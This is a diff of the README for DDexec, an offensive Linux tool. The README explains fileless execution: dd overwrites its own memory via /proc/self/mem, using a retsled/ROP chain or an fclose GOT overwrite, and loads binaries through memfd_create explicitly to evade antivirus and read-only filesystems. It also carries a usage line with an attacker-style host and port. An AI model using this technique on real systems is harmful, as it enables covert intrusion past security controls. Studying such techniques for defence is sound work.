@@ -42,25 +42,35 @@ e.g.: DDexec.sh -d /path/to/dd [-l /path/to/libc] -P 4444 -H 10.10.10.10 -a x86_
 
 ## Explanation
 DDexec is a technique to **load arbitrary shellcodes and binaries in memory from a shell** in a linux system without needing to write anything into disk.
+
 This can help you **avoid AVs and protections** (*like a filesystem mounted as Read Only*).
+
 Basically, this program will prepare a cmd line that will make **`dd` overwrite itself during execution in memory and execute a defined shellcode or a different binary.**
+
 Therefore, what the prepared cmd line is going to do is to use **`dd` to write a shellcode its own memory (via */proc/self/mem*) and then get control the RIP of the dd process to execute the shellcode**.
+
 In order to control the RIP **2 techniques** are implemented in `DDexec.sh`:
 
 ### Retsled
 **This technique was defined and developed by [Arget](https://google.com) TODO: Put arget github**
+
 This technique uses a retsled to overwrite an important part of the stack of the proccess with the goal of overwritting a RIP address inside the stack with a series of RET. At the end of the retsled a ROP chain is located, so once the RIP is controled by a RET instruction of the retsled the execution will arrive to the ROP chain.
+
 This ROP chain will read the shellcode usnig the `read()` function from `libc` and write it in `0x0000555555554000`.
+
 *This technique generates a **bigger cmd line** than then next technique, maily because of the retsled, but **works with any `dd`**. It's the default teachnique when the dd binary is protected with full relro*
 
 ### fclose GOT
 Based on the technique described in https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md this technique **writes the shellcode in the GOT** of the last function executed by `dd` before exiting: **`fclose`**. Therefore, when **`fclose` is executed, the shellcode will be executed instead**.
+
 *This technique **won't work if the `dd` binary is protected with full relro** because then the GOT table isn't writable*
+
 
 *Both techniques are possible because the **ASLR is disabled** when executing `dd` using `setarch`.*
 
 ### Binary load
 This technique was taken from **https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.mdaslr**.
+
 In orer to **load a binary inside dd and execute it** the following steps are performed:
 - Use a shellcode which will create a memfd file in a memory. This is done using the system call *memfd_create()* which creates an anonymous file and returns a file descriptor that refers to it. The file **behaves like a regular file. However, it lives in RAM** and is automatically released when all references to it are dropped.
 - Inject the shellcode into a `dd` process (using one of the 2 previous techniques)
@@ -81,7 +91,9 @@ lrwx------ 1 kali kali 64 Dec 27 12:22 0 -> '/memfd:AAAA (deleted)'
 lrwx------ 1 kali kali 64 Dec 27 12:25 2 -> /dev/pts/4
 ```
 Notice how one of the file descriptors is **`memfd` aparently "deleted"**. Note how the fd is `0` (in this example).
+
 Then, to **load the binary in memory** you just need to **write it in this file**. For that purpose `DDexec.sh` will have echoed **a cmd line prepared to decode the base64 of the binary and write it in the file descriptor** (*change the fd index of the cmd line if necessary*).
+
 Just execute that cmd line in the target system. It will look like this:
 ```bash
 # Change the fd number if necesSary
